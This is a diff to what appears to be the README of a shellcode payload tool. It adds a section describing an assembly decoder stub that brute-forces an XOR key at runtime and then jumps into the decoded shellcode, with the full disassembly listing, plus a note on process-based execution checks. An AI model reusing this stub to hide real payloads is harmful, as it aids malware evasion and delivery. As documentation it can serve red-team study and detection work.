@@ -54,6 +54,37 @@ Self decoding payload written in assembly
 
 Predefined configuation file can be found in configs folder.
 
+# The actual decoder
+
+This tool rely on a simple assembly stub to decode the encoded shellcode. As you can see the key is unknown and it get brute forced at runtime. Since the loop is writting in assembly doing millions of rounds is fairly fast on a modern system.
+
+```
+Decoder assembly:
+   0:   eb 2f                   jmp    31 
+   2:   58                      pop    eax
+   3:   31 c9                   xor    ecx,ecx
+   5:   89 cb                   mov    ebx,ecx
+   7:   6a 04                   push   0x4
+   9:   5a                      pop    edx
+   a:   43                      inc    ebx
+   b:   ff 30                   push   DWORD PTR [eax]
+   d:   59                      pop    ecx
+   e:   0f c9                   bswap  ecx
+  10:   31 d9                   xor    ecx,ebx
+  12:   81 f9 41 75 49 48       cmp    ecx,[MAGIC]
+  18:   75 f0                   jne    a 
+  1a:   0f cb                   bswap  ebx
+  1c:   31 c9                   xor    ecx,ecx
+  1e:   81 c1 05 00 00 00       add    ecx,[NUMBER_OF_CHUNK]
+  24:   01 d0                   add    eax,edx
+  26:   31 18                   xor    DWORD PTR [eax],ebx
+  28:   e2 fa                   loop   24 
+  2a:   2d 14 00 00 00          sub    eax,[FULL_SIZE]
+  2f:   ff e0                   jmp    eax
+  31:   e8 cc ff ff ff          call   2 
+  [OPCODE] 
+```
+
 ###### process
 Check if a specific process is running. If it does not run the binary exit without running the payload.
 
